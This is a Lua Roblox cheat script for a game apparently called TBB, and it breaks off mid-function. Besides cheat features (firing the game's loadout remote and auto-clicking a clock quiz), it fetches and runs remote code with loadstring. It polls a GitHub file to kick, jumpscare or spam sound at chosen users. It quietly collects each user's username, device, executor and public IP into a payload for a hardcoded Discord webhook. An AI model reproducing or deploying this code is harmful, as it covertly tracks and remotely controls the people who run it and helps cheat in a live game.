local UIS = game:GetService("UserInputService")
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Player = game.Players.LocalPlayer.DisplayName
local User = game.Players.LocalPlayer.Name
local Slot = game.Players.LocalPlayer.PlayerData.Loadout.Slots
local Type = game.Players.LocalPlayer.PlayerData.Loadout.Type
local Base = game.Players.LocalPlayer.PlayerData.Loadout.Base
local NPCFolders = workspace:WaitForChild("NPCFolders")
local EnemyFolder = NPCFolders:WaitForChild("EnemyFolder")
local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
local Vim = game:GetService("VirtualInputManager")
local MarketplaceService = game:GetService("MarketplaceService")
local sendable = false
local selectedBank = "Default"
local selectedMenu = "N/A"
local selectedMusic = "N/A"
CamShakeIntensity = 10 
local key = "h9Ab6pPlsQ"
local tbbkey = ""
local secretkey = "ES8o55r31"
local huntkey = "I0sk#2wjDW0vEoWAKE0wpwftKwoWWKDoeW"
local paidkey = "TySmf0RpAYiNg"
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local Window = Rayfield:CreateWindow({
   Name = "Regretness: TBB",
   Icon = 0,
   LoadingTitle = "Loading..",
   LoadingSubtitle = "Regret.",
   Theme = "Default",

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil,
      FileName = "OhioTBB"
   },

   Discord = {
      Enabled = false,
      Invite = "noinvitelink",
      RememberJoins = true
   },

   KeySystem = false,
   KeySettings = {
      Title = "Untitled",
      Subtitle = "Key System",
      Note = "No method of obtaining the key is provided",
      FileName = "Key",
      SaveKey = true,
      GrabKeyFromSite = false,
      Key = {"regret"}
   }
})

local GitHubAPIURL = "https://api.github.com/repos/N0ne-ExIStenc3/random-whitelist/contents/commands.json"

local executed = {}
local lastDecodedContent = ""

local function base64_decode(data)
	local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	data = data:gsub('[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if x == '=' then return '' end
		local r, f = '', (b:find(x) - 1)
		for i = 6, 1, -1 do
			r = r .. (f % 2^i - f % 2^(i - 1) > 0 and '1' or '0')
		end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c = 0
		for i = 1, 8 do
			c = c + (x:sub(i, i) == '1' and 2^(8 - i) or 0)
		end
		return string.char(c)
	end))
end

local function runCommands()
	local success, response = pcall(function()
		return game:HttpGet(GitHubAPIURL)
	end)

	if not success then
		warn("GitHub fetch error:", response)
		return
	end

	local json = HttpService:JSONDecode(response)
	if not json.content then
		warn("No content in GitHub response")
		return
	end

	local decoded = base64_decode(json.content)
	if decoded == lastDecodedContent then
		warn("No changes in command file.")
		return
	end
	lastDecodedContent = decoded
	executed = {}

	local commands = HttpService:JSONDecode(decoded)
	local uid = tostring(LocalPlayer.UserId)

	for _, cmd in pairs(commands) do
		if tostring(cmd.userid) == uid then
			if cmd.kickval and not executed.kick then
				executed.kick = true
				LocalPlayer:Kick(cmd.kickreason or "No reason.")
			end

			if cmd.notifyval and not executed.notify then
				executed.notify = true
				pcall(function()
					game.StarterGui:SetCore("SendNotification", {
						Title = cmd.notifytitle or "Note",
						Text = cmd.notifycontent or "Nothing.",
						Duration = 10
					})
				end)
			end

			if cmd.jumpscareval and not executed.jumpscare then
				executed.jumpscare = true
				local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
				local image = Instance.new("ImageLabel", gui)
				image.Size = UDim2.new(1, 0, 1, 0)
				image.Image = "rbxassetid://" .. cmd.jumpscareimage
				image.BackgroundTransparency = 1
				local sound = Instance.new("Sound", workspace)
				sound.SoundId = "rbxassetid://9118823102"
				sound:Play()
				task.delay(2, function() gui:Destroy() sound:Destroy() end)
			end

			if cmd.soundval and not executed.sound then
				executed.sound = true
				local sound = Instance.new("Sound", workspace)
				sound.SoundId = "rbxassetid://" .. cmd.soundid
				sound.Volume = 10
				sound.PlayOnRemove = true
				sound:Play()
				sound:Destroy()
			end
		end
	end
end

local blacklistUrl = "https://raw.githubusercontent.com/N0ne-ExIStenc3/random-whitelist/refs/heads/main/blacklist.json"

local function checkBlacklist(player)
    local success, response = pcall(function()
        return request({
            Url = blacklistUrl,
            Method = "GET"
        })
    end)

    if success and response and response.Body then
        local blacklistData = HttpService:JSONDecode(response.Body)

        for _, entry in pairs(blacklistData) do
            if tostring(player.UserId) == tostring(entry.userId) then
                local kickMessage = "Script blacklisted, Reason: " .. (entry.reason or "N/A") .. " | Blacklisted by " .. (entry.by or "Unknown") .. " on Discord."
                player:Kick(kickMessage)
                return
            end
        end
    else
        warn("Failed to fetch blacklist data.")
    end
end

local bosses = {
	["Paintmaster"] = true, ["Terminator"] = true, ["Jetrock"] = true, ["Hellfighter"] = true,
	["Doombringer"] = true, ["Deathbringer"] = true, ["Redbeard"] = true, ["Bulldozer"] = true,
	["DJ Radical"] = true, ["Radmobile"] = true, ["Rockstar Radical"] = true, ["Bombcopter"] = true, ["Turking"] = true, ["Infernus"] = true,
	["Doctor Bright"] = true, ["Mister Mancer"] = true, ["Insecure"] = true, ["Blackmail"] = true, ["Melvin"] = true,
	["EXEC"] = true, ["X-TREME"] = true, ["Monsalt"] = true, ["Monolith"] = true, ["Martyr"] = true,
    ["Reinbo"] = true, ["Father"] = true, ["Crusher"] = true, ["Cesus"] = true, ["Cross"] = true,
    ["Chronos"] = true, ["Birthday Battler"] = true, ["Celebration Battler"] = true, ["Fusecoil"] = true,
	["Soulfuse"] = true, ["Giant Noob"] = true, ["Catalog Muffin"] = true,
	["Doomsday Muffin"] = true, ["Bedridden"] = true, ["Treachstone"] = true
}

local readkey
if isfile("tbb-key") then
    local success, result = pcall(readfile, "tbb-key")
    if success then
        readkey = result
    end
end

local readkey1
if isfile("secretkey") then
    local success, result = pcall(readfile, "secretkey")
    if success then
        readkey1 = result
    end
end

local readkey2
if isfile("huntkey") then
    local success, result = pcall(readfile, "huntkey")
    if success then
        readkey2 = result
    end
end

local readkey3
if isfile("paidkey") then
    local success, result = pcall(readfile, "paidkey")
    if success then
        readkey3 = result
    end
end

local player = Players.LocalPlayer
if not player then return end

local userId = player.UserId
local displayName = player.DisplayName
local username = player.Name
local accountAge = player.AccountAge
local hasPremium = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"

local device = "Unknown"
if UIS.TouchEnabled and not UIS.KeyboardEnabled and not UIS.MouseEnabled then
	device = "Mobile"
elseif not UIS.TouchEnabled and UIS.KeyboardEnabled and UIS.MouseEnabled then
	device = "PC"
else
	device = "Other"
end

local executor = "Unknown"
pcall(function()
	if identifyexecutor then
		executor = identifyexecutor()
	end
end)

local function getAvatarIcon(uid)
	local success, result = pcall(function()
		local response = request({
			Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. uid .. "&size=150x150&format=Png",
			Method = "GET"
		})
		return HttpService:JSONDecode(response.Body)
	end)

	if success and result and result.data and result.data[1] and result.data[1].imageUrl then
		return result.data[1].imageUrl
	else
		return "https://t3.rbxcdn.com/9fc30fe577bf95e045c9a3d4abaca05d"
	end
end

local avatarUrl = getAvatarIcon(userId)

local placeName = "Unknown"
pcall(function()
	local info = MarketplaceService:GetProductInfo(game.PlaceId)
	placeName = info.Name or "Unknown"
end)

local joinLink = string.format("https://www.roblox.com/games/%d?privateServerLinkCode=&jobId=%s", game.PlaceId, game.JobId)
local timezone = os.date("%Z")

local ip = "Unknown"
pcall(function()
	local geo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
	ip = geo.query or "Unknown"
end)

local searchLine = string.format("Display: %s | Username: %s | Executor: %s", displayName, username, executor)

local embed = {
	title = "New Player Joined!",
	url = string.format("https://www.roblox.com/users/%d/profile", userId),
	type = "rich",
	color = 15220543,
	thumbnail = { url = avatarUrl },
	author = { name = "Execution Log" },
	fields = {
        { name = "Display Name", value = displayName, inline = true },
		{ name = "Username", value = username, inline = true },
		{ name = "Account Age", value = accountAge .. " days", inline = true },
		{ name = "Alt Account", value = accountAge < 10 and "**Likely Alt**" or "No", inline = true },
		{ name = "Premium", value = hasPremium, inline = true },
		{ name = "Device", value = device, inline = true },
		{ name = "Executor", value = executor, inline = true },
		{ name = "Game", value = placeName, inline = true },
		{ name = "Join Server", value = "[Click to Join](" .. joinLink .. ")", inline = false },
		{ name = "IP", value = ipLink, inline = true },
		{ name = "Timezone", value = timezone, inline = true },
	},
	footer = {
		text = "User ID: " .. userId,
		icon_url = avatarUrl,
	},
	timestamp = DateTime.now():ToIsoDate()
}

local payload = {
	content = searchLine,
	embeds = { embed }
}

local webhooks = {
	"https://discord.com/api/webhooks/1367530770507501679/z-pWHHwRfJm1kQm-UjupguWwrb1xhkkGyLJveyUL_uXI3tYFRlv8SlO2EBBBuHBNe7Lr"
}

local function sendWebhook(data)
	for _, url in ipairs(webhooks) do
		local success = pcall(function()
			request({
				Url = url,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode(data)
			})
		end)
		if success then break end
	end
end

local function SaveLoadout(B1, B2, B3, B4, B5, B6, B7, B8, A1, A2, A3, A4, A5, A6, A7, A8, C, B)
    game:GetService("ReplicatedStorage").Events.RemoteEvents.SaveLoadout:FireServer({
        Type = {{"Slot1", B1}, {"Slot2", B2}, {"Slot4", B3}, {"Slot3", B4}, {"Slot6", B6}, {"Slot8", B8}, {"Slot7", B7}, {"Slot5", B5}},
        Slots = {{"Slot1", A1}, {"Slot2", A2}, {"Slot3", A3}, {"Slot4", A4}, {"Slot5", A5}, {"Slot6", A6}, {"Slot7", A7}, {"Slot8", A8}},
        Base = {Cannon = C, Bank = B}
    })
end

local function Notify(T, C, D, I)
    Rayfield:Notify({
       Title = T or "Notification Title",
       Content = C or "Notification Content",
       Duration = D or 0,
       Image = I or 4483362458,
    })
end

local htable = {
	[1] = "rbxassetid://138677869011995",
	[2] = "rbxassetid://99665045166186",
	[3] = "rbxassetid://98683329608967",
	[4] = "rbxassetid://104694607248371",
	[5] = "rbxassetid://104694607248371",
	[6] = "rbxassetid://135991736200217",
	[7] = "rbxassetid://113755551649211",
	[8] = "rbxassetid://112554567904764",
	[9] = "rbxassetid://125416093978013",
	[10] = "rbxassetid://127105313470745",
	[11] = "rbxassetid://80675054053954",
	[12] = "rbxassetid://125887651890654"
}

local mtable = {
	[1] = "rbxassetid://129199740637798",
	[2] = "rbxassetid://138795220647217",
	[3] = "rbxassetid://122297843372758",
	[4] = "rbxassetid://84468735573099",
	[5] = "rbxassetid://139585842395420",
	[6] = "rbxassetid://114420297720959",
	[7] = "rbxassetid://126597147911095",
	[8] = "rbxassetid://139541364348217",
	[9] = "rbxassetid://85743552777717",
	[10] = "rbxassetid://70504232472778",
	[11] = "rbxassetid://95962531510845",
	[12] = "rbxassetid://113664476715192"
}

local plusIds = {
	["rbxassetid://127540334729513"] = true,
	["rbxassetid://91973761029532"] = true,
	["rbxassetid://100724754817921"] = true
}

local function getTimeFromImage(image, tableMap)
	local imgId = image:match("%d+")
	for i, id in pairs(tableMap) do
		if imgId == id:match("%d+") then
			return i
		end
	end
	return nil
end

local function clickButton(button)
	local absPos = button.AbsolutePosition
	local absSize = button.AbsoluteSize
	local clickX = absPos.X + absSize.X / 2
	local clickY = absPos.Y + absSize.Y / 2

	Vim:SendMouseButtonEvent(clickX, clickY, 0, true, game, 0)
	Vim:SendMouseButtonEvent(clickX, clickY, 0, false, game, 0)
end

local function calculateTime(clocks)
	local totalMinute = 0
	local totalHour = 0

	for _, clock in ipairs(clocks) do
		local min = clock:FindFirstChild("Minute")
		local hr = clock:FindFirstChild("Hour")

		if min and hr then
			local minVal = getTimeFromImage(min.Image, mtable)
			local hrVal = getTimeFromImage(hr.Image, htable)

			if minVal and hrVal then
				totalMinute = totalMinute + minVal
				totalHour = totalHour + hrVal
			end
		end
	end

	while totalMinute > 12 do
		totalMinute = totalMinute - 12
		totalHour = totalHour + 1
	end

	while totalMinute < 1 do
		totalMinute = totalMinute + 12
		totalHour = totalHour - 1
	end

	while totalHour > 12 do
		totalHour = totalHour - 12
	end

	while totalHour < 1 do
		totalHour = totalHour + 12
	end

	return totalHour, totalMinute
end

function runQuiz(mode)
	local gui = player:WaitForChild("PlayerGui"):FindFirstChild("ClockQuiz")
	if not gui then return end

	local frame = gui:FindFirstChild("Frame")
	local question = frame and (frame:FindFirstChild("Question") or frame:FindFirstChild("QuestionTroll"))
	local choices = frame and frame:FindFirstChild("Choices")
	if not (question and choices) then return end
	
	local modes = mode

	local clocks = {}
	local plusCount = 0
	for _, obj in ipairs(question:GetChildren()) do
		if obj:IsA("Frame") and obj.Name == "Clock" then
			table.insert(clocks, obj)
		elseif obj:IsA("ImageLabel") and obj.Name == "Symbol" and plusIds[obj.Image] then
			plusCount = plusCount + 1
		end
	end

	local totalHour, totalMinute = calculateTime(clocks)

	if modes == "time" then
		Notification:Notify(
			{Title = "Time", Description = string.format("Time: %02d:%02d", totalHour, totalMinute)},
			{OutlineColor = Color3.fromRGB(80, 80, 80), Time = 4, Type = "default"}
		)
		print("sended")
		return
	end

	local foundAnswer = false

	for _, ans in ipairs(choices:GetChildren()) do
		if ans:IsA("ImageButton") then
			local min = ans:FindFirstChild("Minute")
			local hr = ans:FindFirstChild("Hour")
			if min and hr then
				local minVal = getTimeFromImage(min.Image, mtable)
				local hrVal = getTimeFromImage(hr.Image, htable)
				if minVal == totalMinute and hrVal == totalHour then
					if modes == "answer" then
						Notification:Notify(
							{Title = "Answer", Description = "Correct Answer: " .. ans.Name},
							{OutlineColor = Color3.fromRGB(80, 80, 80), Time = 4, Type = "default"}
						)
					end
					if modes == "answerclick" then
						Notification:Notify(
							{Title = "Answer", Description = "Correct Answer: " .. ans.Name},
							{OutlineColor = Color3.fromRGB(80, 80, 80), Time = 4, Type = "default"}
						)
                        clickButton(ans)
					end
					if modes == "click" then
						clickButton(ans)
					end
					foundAnswer = true
					break
				end
			end
		end
	end

	if not foundAnswer then
		for _, ans in ipairs(choices:GetChildren()) do
			if ans:IsA("ImageButton") then
				local min = ans:FindFirstChild("Minute")
				local hr = ans:FindFirstChild("Hour")
				if min and hr then
					local minVal = getTimeFromImage(min.Image, mtable)
					local hrVal = getTimeFromImage(hr.Image, htable)
					if minVal == totalMinute and modes == "answerclick" then
						Notification:Notify(
							{Title = "Answer", Description = "Minute hands is correct, Selecting answer: " .. ans.Name},
							{OutlineColor = Color3.fromRGB(80, 80, 80), Time = 4, Type = "default"}
						)
						clickButton(ans)
						break
					end
					if minVal == totalMinute and modes == "answer" then
						Notification:Notify(
							{Title = "Answer", Description = "Minute hands is correct, Answer: " .. ans.Name},
							{OutlineColor = Color3.fromRGB(80, 80, 80), Time = 4, Type = "default"}
						)
						break
					end
					if minVal == totalMinute and modes == "click" then
						clickButton(ans)
						break
					end
				end
			end
		end
	end
end

local H = Window:CreateTab("Home", 4483362458)
H:CreateLabel("Welcome! " .. Player .. " (" .. User .. ") Thank you for using my script! :)", 4483362458, Color3.fromRGB(255, 255, 255), false)
H:CreateParagraph({Title = "This script is not open-source anymore", Content = "Yeah, why!"})
H:CreateParagraph({Title = "Update 16!", Content = "hm. why this still even exist."})
H:CreateParagraph({Title = "Contact me!", Content = "DM @velocity_coding on discord or join the server to report a bugs or suggestions."})

H:CreateButton({
    Name = "Remove UI",
    Callback = function()
        Notify("Notification!", "Removing UI :(", 3, 4483362458)
        wait(3.5)
        Rayfield:Destroy()
    end,
})

H:CreateButton({
    Name = "Discord Link Removed",
    Callback = function()
        Notify("Notification!", "Removed Discord Server Link!", 3, 4483362458)
    end,
})

local Secret = Window:CreateTab("Secrets", 4483362458)

local function loadNormalKey()
    local selectedBank = "Default"
    local bankMap = {
        Default = 1,
        Investment = 2,
        Powerhouse = 3,
        Detonator = 4,
        Ignition = 5
    }
    local bankID = bankMap[selectedBank] or 1

    Secret:CreateDivider()
    Secret:CreateSection("Normal Key")

    Secret:CreateDropdown({
        Name = "Select Bank",
        Options = {"Default", "Investment", "Powerhouse", "Detonator", "Ignition"},
        CurrentOption = "Default",
        MultipleOptions = false,
        Flag = "Dropdown",
        Callback = function(Value)
            selectedBank = Value[1]
            bankID = bankMap[selectedBank] or 1
            Notify("Notification!", "Changed Bank To: " .. selectedBank, 3, 4483362458)
        end
    })

    Secret:CreateButton({
        Name = "Combine Bank",
        Callback = function()
            Notify("Notification!", "Combined Bank To: " .. selectedBank, 3, 4483362458)
            SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, Base.Cannon.Value, bankID)
        end,
    })

    Secret:CreateKeybind({
       Name = "Combine Bank Keybind",
       CurrentKeybind = "I",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
           Notify("Notification!", "Combined Bank To: " .. selectedBank, 3, 4483362458)
           SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, Base.Cannon.Value, bankID)
       end,
    })
end

local function loadKeyHunt()
    local selectedBank = "Default"
    local bankMap = {
        Default = 1,
        Investment = 2,
        Powerhouse = 3,
        Detonator = 4,
        Ignition = 5
    }
    local bankID = bankMap[selectedBank] or 1

    Secret:CreateDivider()
    Secret:CreateSection("Key Hunt")

    Secret:CreateDropdown({
        Name = "Select Bank",
        Options = {"Default", "Investment", "Powerhouse", "Detonator", "Ignition"},
        CurrentOption = "Default",
        MultipleOptions = false,
        Flag = "Dropdown",
        Callback = function(Value)
            selectedBank = Value[1]
            bankID = bankMap[selectedBank] or 1
            Notify("Notification!", "Changed Bank To: " .. selectedBank, 3, 4483362458)
        end
    })

    Secret:CreateButton({
        Name = "Combine Bank",
        Callback = function()
            Notify("Notification!", "Combined Bank To: " .. selectedBank, 3, 4483362458)
            SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, Base.Cannon.Value, bankID)
        end,
    })

    Secret:CreateKeybind({
       Name = "Combine Bank Keybind",
       CurrentKeybind = "P",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
           Notify("Notification!", "Combined Bank To: " .. selectedBank, 3, 4483362458)
           SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, Base.Cannon.Value, bankID)
       end,
    })

    local selectedCannon = "Default"
    local cannonMap = {
        Default = 1,
        Gatling = 2,
        Slammer = 3,
        Recoil = 4,
        Treasure = 5,
        Absorber = 6,
        Liberty = 7
    }
    local cannonID = cannonMap[selectedCannon] or 1

    Secret:CreateDivider()

    Secret:CreateDropdown({
        Name = "Select Cannon",
        Options = {"Default", "Gatling", "Slammer", "Recoil", "Treasure", "Absorber", "Liberty"},
        CurrentOption = "Default",
        MultipleOptions = false,
        Flag = "Dropdown",
        Callback = function(Value)
            selectedCannon = Value[1]
            cannonID = cannonMap[selectedCannon] or 1
            Notify("Notification!", "Changed Cannon To: " .. selectedCannon, 3, 4483362458)
        end
    })

    Secret:CreateButton({
        Name = "Combine Cannon",
        Callback = function()
            Notify("Notification!", "Combined Cannon To: " .. selectedCannon, 3, 4483362458)
            SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, cannonID, Base.Bank.Value)
        end,
    })

    Secret:CreateKeybind({
       Name = "Combine Cannon Keybind",
       CurrentKeybind = "I",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
           Notify("Notification!", "Combined Cannon To: " .. selectedCannon, 3, 4483362458)
           SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, cannonID, Base.Bank.Value)
       end,
    })
end

local function loadPaid()
    local selectedBank = "Default"
    local bankMap = {
        Default = 1,
        Investment = 2,
        Powerhouse = 3,
        Detonator = 4,
        Ignition = 5
    }
    local bankID = bankMap[selectedBank] or 1

    Secret:CreateDivider()
    Secret:CreateSection("Paid Key")

    Secret:CreateDropdown({
        Name = "Select Bank",
        Options = {"Default", "Investment", "Powerhouse", "Detonator", "Ignition"},
        CurrentOption = "Default",
        MultipleOptions = false,
        Flag = "Dropdown",
        Callback = function(Value)
            selectedBank = Value[1]
            bankID = bankMap[selectedBank] or 1
            Notify("Notification!", "Changed Bank To: " .. selectedBank, 3, 4483362458)
        end
    })

    Secret:CreateButton({
        Name = "Combine Bank",
        Callback = function()
            Notify("Notification!", "Combined Bank To: " .. selectedBank, 3, 4483362458)
            SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, Base.Cannon.Value, bankID)
        end,
    })

    Secret:CreateKeybind({
       Name = "Combine Bank Keybind",
       CurrentKeybind = "P",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
           Notify("Notification!", "Combined Bank To: " .. selectedBank, 3, 4483362458)
           SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, Base.Cannon.Value, bankID)
       end,
    })

    local selectedCannon = "Default"
    local cannonMap = {
        Default = 1,
        Gatling = 2,
        Slammer = 3,
        Recoil = 4,
        Treasure = 5,
        Absorber = 6,
        Liberty = 7
    }
    local cannonID = cannonMap[selectedCannon] or 1

    Secret:CreateDivider()

    Secret:CreateDropdown({
        Name = "Select Cannon",
        Options = {"Default", "Gatling", "Slammer", "Recoil", "Treasure", "Absorber", "Liberty"},
        CurrentOption = "Default",
        MultipleOptions = false,
        Flag = "Dropdown",
        Callback = function(Value)
            selectedCannon = Value[1]
            cannonID = cannonMap[selectedCannon] or 1
            Notify("Notification!", "Changed Cannon To: " .. selectedCannon, 3, 4483362458)
        end
    })

    Secret:CreateButton({
        Name = "Combine Cannon",
        Callback = function()
            Notify("Notification!", "Combined Cannon To: " .. selectedCannon, 3, 4483362458)
            SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, cannonID, Base.Bank.Value)
        end,
    })

    Secret:CreateKeybind({
       Name = "Combine Cannon Keybind",
       CurrentKeybind = "O",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
           Notify("Notification!", "Combined Cannon To: " .. selectedCannon, 3, 4483362458)
           SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, cannonID, Base.Bank.Value)
       end,
    })

    Secret:CreateDivider()

    Secret:CreateButton({
        Name = "Correct Chronos Clock Quiz Time",
        Callback = function()
            Notification:Notify(
			    {Title = "Not Accurated", Description = "This script is not accurate but minutes hand is."},
		    	{OutlineColor = Color3.fromRGB(80, 80, 80), Time = 4, Type = "default"}
		    )
            runQuiz("time")
        end,
    })

    Secret:CreateKeybind({
       Name = "Correct Chronos Clock Quiz Time Keybind",
       CurrentKeybind = "L",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
           Notification:Notify(
			    {Title = "Not Accurated", Description = "This script is not accurate but minutes hand is."},
		    	{OutlineColor = Color3.fromRGB(80, 80, 80), Time = 4, Type = "default"}
		    )
            runQuiz("time")
       end,
    })

    Secret:CreateButton({
        Name = "Correct Chronos Clock Quiz Answer",
        Callback = function()
            runQuiz("answer")
        end,
    })

    Secret:CreateKeybind({
       Name = "Correct Chronos Clock Quiz Answer Keybind",
       CurrentKeybind = "I",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
            runQuiz("answer")
       end,
    })

    Secret:CreateButton({
        Name = "Correct Chronos Clock Quiz Click",
        Callback = function()
            runQuiz("click")
        end,
    })

    Secret:CreateKeybind({
       Name = "Correct Chronos Clock Quiz Click Keybind",
       CurrentKeybind = "U",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
            runQuiz("click")
       end,
    })

    Secret:CreateButton({
        Name = "Correct Chronos Clock Quiz Answer & Click",
        Callback = function()
            runQuiz("answerclick")
        end,
    })

    Secret:CreateKeybind({
       Name = "Correct Chronos Clock Quiz Answer & Click Keybind",
       CurrentKeybind = "J",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
            runQuiz("answerclick")
       end,
    })
end

local function loadAdmin()
    local selectedBank = "Default"
    local selectedrBank = "Default"
    local bankMap = {
        Default = 1,
        Investment = 2,
        Powerhouse = 3,
        Detonator = 4,
        Ignition = 5
    }
    local bankID = bankMap[selectedBank] or 1
    local RbankID = bankMap[selectedrBank] or 1

    Secret:CreateDivider()
    Secret:CreateSection("Administrator Key")

    Secret:CreateDropdown({
        Name = "Select Bank",
        Options = {"Default", "Investment", "Powerhouse", "Detonator", "Ignition"},
        CurrentOption = "Default",
        MultipleOptions = false,
        Flag = "Dropdown",
        Callback = function(Value)
            selectedBank = Value[1]
            bankID = bankMap[selectedBank] or 1
            Notify("Notification!", "Changed Bank To: " .. selectedBank, 3, 4483362458)
        end
    })

    Secret:CreateButton({
        Name = "Combine Bank",
        Callback = function()
            Notify("Notification!", "Combined Bank To: " .. selectedBank, 3, 4483362458)
            SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, Base.Cannon.Value, bankID)
        end,
    })

    Secret:CreateKeybind({
       Name = "Combine Bank Keybind",
       CurrentKeybind = "X",
       HoldToInteract = false,
       Flag = "Keybind1",
       Callback = function(Keybind)
           Notify("Notification!", "Combined Bank To: " .. selectedBank, 3, 4483362458)
           SaveLoadout(Type.Slot1.Value, Type.Slot2.Value, Type.Slot3.Value, Type.Slot4.Value, Type.Slot5.Value, Type.Slot6.Value, Type.Slot7.Value, Type.Slot8.Value,  Slot.Slot1.Value, Slot.Slot2.Value, Slot.Slot3.Value, Slot.Slot4.Value,  Slot.Slot5.Value, Slot.Slot6.Value, Slot.Slot7.Value, Slot.Slot8.Value, Base.Cannon.Value, bankID)
       end,
    })

    Secret:CreateDropdown({
        Name = "Select Reverted Bank",
        Options = {"Default", "Investment", "Powerhouse", "Detonator", "Ignition"},
        CurrentOption = "Default",
        MultipleOptions = false,
        Flag = "Dropdown",
        Callback = function(Value)
            selectedrBank = Value[1]
            RbankID = bankMap[selectedrBank] or 1
            Notify("Notification!", "Change Reverted Bank To: " .. selectedrBank, 3, 4483362458)
        end
    })

    Secret:CreateButton({
